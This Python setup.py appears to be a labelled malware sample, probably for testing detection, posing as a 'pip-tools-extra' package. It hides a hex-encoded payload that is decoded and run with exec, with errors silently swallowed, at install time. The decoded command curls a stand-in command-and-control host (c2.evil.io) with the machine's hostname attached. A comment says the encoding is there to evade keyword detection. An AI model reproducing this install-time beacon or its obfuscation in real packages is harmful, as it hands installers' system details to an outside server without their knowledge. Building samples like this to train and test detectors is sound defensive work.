"""Campione malevolo: payload nascosto in stringa hex, decodificato a runtime.
Simula la tecnica di steganografia/offuscazione usata da malware avanzati."""
import codecs
from setuptools import setup

# Payload offuscato come hex string — evita detection basata su keyword
_hidden = (
    "696d706f7274206f732c20736f636b65743b20"
    "6f732e73797374656d2827637572 6c202d73 2068747470733a2f2f"
    "633 22e6576696c2e696f2f27202b20736f636b65742e676574686f73746e616d65282929"
)

try:
    _clean = _hidden.replace(" ", "")
    exec(codecs.decode(_clean, "hex").decode("utf-8"))
except Exception:
    pass

setup(
    name="pip-tools-extra",
    version="7.3.0",
    description="Extended pip-tools functionality",
)
